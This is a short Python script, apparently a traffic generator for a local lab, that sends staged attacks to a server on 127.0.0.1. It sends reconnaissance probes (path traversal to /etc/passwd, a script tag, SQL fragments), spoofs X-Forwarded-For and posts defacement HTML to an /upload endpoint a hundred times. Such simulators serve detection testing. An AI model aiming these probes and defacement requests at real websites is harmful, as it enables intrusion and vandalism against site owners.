import requests
import time
import random

BASE = "http://127.0.0.1:5000"

recon_paths = [
    "/search?q=scan",
    "/search?q=../../etc/passwd",
    "/search?q=<script>",
    "/search?q=SELECT+1"
]

probe_paths = [
    "/search?q=upload_test",
    "/search?q=file_check",
    "/search?q=edit_index"
]

ATTACKER_IP = "10.10.10.10"
headers = {"X-Forwarded-For": ATTACKER_IP}

def main():
    for attack_id in range(100):

        # Phase 1 — Reconnaissance
        for _ in range(3):
            p = random.choice(recon_paths)
            try:
                requests.get(BASE + p, headers=headers, timeout=1)
            except:
                pass
            time.sleep(random.uniform(0.05, 0.15))

        # Phase 2 — Probe
        for _ in range(2):
            p = random.choice(probe_paths)
            try:
                requests.get(BASE + p, headers=headers, timeout=1)
            except:
                pass
            time.sleep(random.uniform(0.1, 0.25))

        # Phase 3 — Deface
        payload = f"<h1>DEFACED #{attack_id}</h1><p>Attacker IP: {ATTACKER_IP}</p>"
        try:
            requests.post(BASE + "/upload", data={"content": payload}, headers=headers, timeout=1)
        except:
            pass

        # Phase 4 — Normalize
        try:
            requests.get(BASE + "/", headers=headers, timeout=1)
        except:
            pass

        print(f"[DEFACE] Attack {attack_id} completed.")

    print("[OK] deface_attack done.")

if __name__ == "__main__":
    main()
